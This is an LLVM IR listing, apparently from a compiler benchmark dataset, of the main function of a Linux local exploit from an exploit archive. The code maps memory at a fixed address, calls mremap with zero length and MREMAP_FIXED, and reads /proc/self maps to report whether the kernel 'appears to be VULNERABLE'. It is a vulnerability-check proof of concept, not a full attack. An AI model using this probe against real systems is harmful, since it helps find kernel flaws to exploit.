; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_142.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_142.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"/proc/%d/maps\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"Unable to open %s\0A\00", align 1
@VMASIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [23 x i8] c"\0ABase address : 0x%x\0A\0A\00", align 1
@MAPS_NO_CHECK = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [30 x i8] c"\0ARemapping at 0x70000000...\0A\0A\00", align 1
@MREMAP_MAYMOVE = common dso_local global i32 0, align 4
@MREMAP_FIXED = common dso_local global i32 0, align 4
@MAPS_CHECK = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [12 x i8] c"\0AReport : \0A\00", align 1
@mremap_check = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [39 x i8] c"This kernel appears to be VULNERABLE\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [43 x i8] c"This kernel appears to be NOT VULNERABLE\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [16 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 (...) @getpid()
  store i32 %10, i32* %8, align 4
  %11 = getelementptr inbounds [16 x i8], [16 x i8]* %7, i64 0, i64 0
  %12 = load i32, i32* %8, align 4
  %13 = call i32 @sprintf(i8* %11, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i32 %12)
  %14 = getelementptr inbounds [16 x i8], [16 x i8]* %7, i64 0, i64 0
  %15 = load i32, i32* @O_RDONLY, align 4
  %16 = call i32 @open(i8* %14, i32 %15)
  store i32 %16, i32* %9, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %22, label %18

18:                                               ; preds = %2
  %19 = load i32, i32* @stderr, align 4
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %7, i64 0, i64 0
  %21 = call i32 @fprintf(i32 %19, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %20)
  store i32 1, i32* %3, align 4
  br label %58

22:                                               ; preds = %2
  %23 = load i32, i32* @VMASIZE, align 4
  %24 = load i32, i32* @PROT_READ, align 4
  %25 = load i32, i32* @PROT_WRITE, align 4
  %26 = or i32 %24, %25
  %27 = load i32, i32* @MAP_PRIVATE, align 4
  %28 = load i32, i32* @MAP_ANONYMOUS, align 4
  %29 = or i32 %27, %28
  %30 = call i8* @mmap(i8* inttoptr (i64 1610612736 to i8*), i32 %23, i32 %26, i32 %29, i32 0, i32 0)
  store i8* %30, i8** %6, align 8
  %31 = load i8*, i8** %6, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0), i8* %31)
  %33 = load i32, i32* %9, align 4
  %34 = getelementptr inbounds [16 x i8], [16 x i8]* %7, i64 0, i64 0
  %35 = load i32, i32* @MAPS_NO_CHECK, align 4
  %36 = call i32 @read_maps(i32 %33, i8* %34, i32 %35)
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %38 = load i8*, i8** %6, align 8
  %39 = load i32, i32* @MREMAP_MAYMOVE, align 4
  %40 = load i32, i32* @MREMAP_FIXED, align 4
  %41 = or i32 %39, %40
  %42 = call i8* @real_mremap(i8* %38, i32 0, i32 0, i32 %41, i8* inttoptr (i64 1879048192 to i8*))
  store i8* %42, i8** %6, align 8
  %43 = load i32, i32* %9, align 4
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %7, i64 0, i64 0
  %45 = load i32, i32* @MAPS_CHECK, align 4
  %46 = call i32 @read_maps(i32 %43, i8* %44, i32 %45)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  %48 = load i64, i64* @mremap_check, align 8
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %52

50:                                               ; preds = %22
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.5, i64 0, i64 0))
  br label %54

52:                                               ; preds = %22
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.6, i64 0, i64 0))
  br label %54

54:                                               ; preds = %52, %50
  %55 = phi i32 [ %51, %50 ], [ %53, %52 ]
  %56 = load i32, i32* %9, align 4
  %57 = call i32 @close(i32 %56)
  store i32 0, i32* %3, align 4
  br label %58

58:                                               ; preds = %54, %18
  %59 = load i32, i32* %3, align 4
  ret i32 %59
}

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @read_maps(i32, i8*, i32) #1

declare dso_local i8* @real_mremap(i8*, i32, i32, i32, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
